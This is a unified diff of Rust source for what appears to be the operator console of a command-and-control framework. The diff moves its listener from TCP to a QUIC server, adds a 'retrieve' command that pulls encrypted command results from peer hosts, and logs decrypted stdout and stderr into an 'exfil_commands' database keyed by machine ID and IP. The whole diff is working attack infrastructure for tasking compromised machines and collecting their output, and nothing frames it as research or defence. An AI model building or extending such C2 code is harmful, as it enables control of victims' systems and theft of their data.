@@ -38,10 +38,14 @@ use rsa::{
     traits::PublicKeyParts,
 };
 use rusqlite::Connection;
-use s2n_quic::{Client, client};
+use s2n_quic::{Client, client, client::Connect};
 use serde::{Deserialize, Serialize};
 use tokio::sync::Mutex;
 use tui_input::{Input, backend::crossterm::EventHandler};
+use s2n_quic::{
+    Server,
+    provider::tls::default::Server as TlsServer,
+};
 
 use crate::{
     c2syncer::{C2Syncer, c2push, c2push_sync, new_quic_client},
@@ -111,7 +115,7 @@ fn send_db_update_message(tx: &mpsc::Sender<UIEvent>, db: &Connection) {
             let stderrlen: i64 = row.get::<_, i64>(3).unwrap();
             let lasttime: String = row.get::<_, String>(4).unwrap();
             Ok(format!(
-                "{machine_id:32} {ip:15} {stdoutlen:10} {stderrlen:10} {lasttime:10}"
+                "{machine_id:32} {ip:16} {stdoutlen:10} {stderrlen:10} {lasttime:10}"
             ))
         })
         .unwrap();
@@ -119,7 +123,7 @@ fn send_db_update_message(tx: &mpsc::Sender<UIEvent>, db: &Connection) {
     let mut lines = Vec::new();
 
     lines.push(format!(
-        "{:32} {:15} {:>10} {:>10} {:12}",
+        "{:32} {:16} {:>10} {:>10} {:12}",
         "MACHINE ID", "IP", "STDOUT LEN", "STDERR LEN", "LAST MESSAGE"
     ));
 
@@ -140,12 +144,12 @@ async fn parse_fast_channel_message(
     tx: mpsc::Sender<UIEvent>,
 ) {
     let Ok(share_decrypted) = key.decrypt(Oaep::new::<Sha256>(), &msg.share) else {
-        // println!("Failed to rsa decrypt");
+        println!("Failed to rsa decrypt");
         return;
     };
 
     let Ok(share) = postcard::from_bytes::<Aes256ShareMessage>(&share_decrypted) else {
-        // println!("Failed to postcard msg.share");
+        println!("Failed to postcard msg.share");
         return;
     };
 
@@ -156,12 +160,12 @@ async fn parse_fast_channel_message(
     let aes = Aes256Gcm::new(&share.key.into());
 
     let Ok(plaintext) = aes.decrypt(nonce, msg.command.as_slice()) else {
-        // println!("Failed to aes decrypt");
+        println!("Failed to aes decrypt");
         return;
     };
 
     let Ok(cmd) = postcard::from_bytes::<CommandExecutionMessage>(&plaintext) else {
-        // println!("Failed to postcard plaintext");
+        println!("Failed to postcard plaintext");
         return;
     };
 
@@ -182,7 +186,7 @@ async fn parse_fast_channel_message(
             let db = db.lock().await;
             db.execute(
                 "INSERT INTO exfil_commands (source_ip, machine_id, stdout, stderr) VALUES (?, ?, ?, ?)",
-                (addr.to_string(), share.machine_id, stdout, stderr)
+                (msg.originip.to_string(), share.machine_id, stdout, stderr)
             ).unwrap(); // TODO: Remove unwrap??
 
             send_db_update_message(&tx, &db);
@@ -204,26 +208,78 @@ async fn afc_listener(
         send_db_update_message(&tx, &db);
     }
 
-    let listener = TcpListener::bind("0.0.0.0:4447").unwrap();
-    // println!("Listening now");
+    let mut server = Server::builder()
+        .with_tls((config::CERTIFICATE, config::KEY))
+        .unwrap()
+        .with_io("0.0.0.0:4448")
+        .unwrap()
+        .with_endpoint_limits(
+            s2n_quic::provider::endpoint_limits::Default::builder()
+            .with_inflight_handshake_limit(10000)
+            .unwrap()
+            .build()
+            .unwrap()
+        )
+        .unwrap()
+        .start()
+        .unwrap();
 
-    let mut buffer = vec![0; MAX_MESSAGE_SIZE];
-    for stream in listener.incoming() {
-        // println!("Accepitng stream");
-        let mut stream = stream.unwrap();
-        let addr = stream.peer_addr().unwrap().ip();
-
-        let Ok(n) = stream.read(&mut buffer) else {
-            // println!("Failed to read stream");
-            continue;
-        };
-
-        if let Ok(data) = postcard::from_bytes::<FastChannelMessage>(&buffer[..n]) {
-            parse_fast_channel_message(&data, &key, addr, &dir, db.clone(), tx.clone()).await;
-        } else {
-            // println!("Failed to postcard buffer");
-        }
+    let mut i: u32 = 0;
+    while let Some(mut connection) = server.accept().await {
+        
+        let tx = tx.clone();
+        let db = db.clone();
+        let dir = dir.clone();
+        let key = key.clone();
+        tokio::spawn(async move {
+            while let Ok(Some(mut stream)) = connection.accept_bidirectional_stream().await {
+                // i += 1;
+                // println!("{i}");
+                let Ok(addr) = stream.connection().remote_addr() else {
+                    // println!("I couldnt parse ip");
+                    continue;
+                };
+    
+                let tx = tx.clone();
+                let db = db.clone();
+                let dir = dir.clone();
+                let key = key.clone();
+                let mut req = Vec::new();
+                while let Ok(Some(r)) = stream.receive().await {
+                    req.extend_from_slice(&r);
+                }
+    
+                // println!("C ");
+                if let Ok(data) = postcard::from_bytes::<FastChannelMessage>(&req) {
+                    parse_fast_channel_message(&data, &key, addr.ip(), &dir, db, tx).await;
+                    // connection.close(0u32.into());
+                } else {
+                    println!("Failed to postcard buffer");
+                }
+            }
+        });
     }
+
+    // let listener = TcpListener::bind("0.0.0.0:4447").unwrap();
+    // // println!("Listening now");
+
+    // let mut buffer = vec![0; MAX_MESSAGE_SIZE];
+    // for stream in listener.incoming() {
+    //     // println!("Accepitng stream");
+    //     let mut stream = stream.unwrap();
+    //     let addr = stream.peer_addr().unwrap().ip();
+
+    //     let Ok(n) = stream.read(&mut buffer) else {
+    //         // println!("Failed to read stream");
+    //         continue;
+    //     };
+
+    //     if let Ok(data) = postcard::from_bytes::<FastChannelMessage>(&buffer[..n]) {
+    //         parse_fast_channel_message(&data, &key, addr, &dir, db.clone(), tx.clone()).await;
+    //     } else {
+    //         // println!("Failed to postcard buffer");
+    //     }
+    // }
 }
 
 struct SqliteUpdateData {
@@ -441,6 +497,66 @@ impl RatatuiApp {
         }
 
         match cmd[0] {
+            "retrieve" => {
+                if cmd.len() < 2 {
+                    self.cmdoutput = "Usage: retrieve <IP:PORT>\n".to_string();
+                    self.cmdoutput += "Example: retrieve 127.0.1.4:4447";
+                    return;
+                }
+
+                let Ok(peer) = cmd[1].parse::<SocketAddr>() else {
+                    self.cmdoutput = "Failed to parse peer IP".to_string();
+                    return;
+                };
+
+                let client = Arc::clone(&self.quic);
+                let tx = self.tx.clone();
+                let db = Arc::clone(&self.aranya.sqlite);
+                let dir = self.aranya.config_dir.clone();
+                let key = self.aranya.load_rsa_key();
+                tokio::spawn(async move {
+                    let conn = client
+                        .connect(Connect::new(peer).with_server_name("localhost"))
+                        .await;
+
+                    if let Ok(mut c) = conn {
+                        if let Ok(mut s) = c.open_bidirectional_stream().await {
+                            let req = FastChannelMessage {
+                                msgtype: common::FastChannelMessageType::REQUEST_DATA,
+                                originip: peer, // Doesn't matter what these are...
+                                share: Vec::new(),
+                                command: Vec::new()
+                            };
+                            s.send(postcard::to_allocvec(&req).expect("Request data fail").into()).await;
+                            s.finish();
+
+                            // if let Ok(Some(mut s)) = c.accept_bidirectional_stream().await {
+                                let mut recv = Vec::new();
+                                while let Ok(Some(data)) = s.receive().await {
+                                    let _ = recv.extend_from_slice(&data);
+                                }
+
+                                // println!("Parsin data len: {}", recv.len());
+                                if let Ok(data) = postcard::from_bytes::<Vec<FastChannelMessage>>(&recv) {
+                                    for msg in data {
+                                        let tx = tx.clone();
+                                        let db = db.clone();
+                                        parse_fast_channel_message(&msg, &key, peer.ip(), &dir, db, tx).await;
+                                    }
+                                    // connection.close(0u32.into());
+                                } else {
+                                    // println!("Failed to postcard buffer");
+                                }
+                            // }
+
+                        } else {
+                            println!("Stream is not open");
+                        }
+                    } else {
+                        println!("Connection is not open");
+                    }
+                });
+            }
             "command" => {
                 if cmd.len() < 2 {
                     self.cmdoutput = "Usage: command <COMMAND...>\n".to_string();
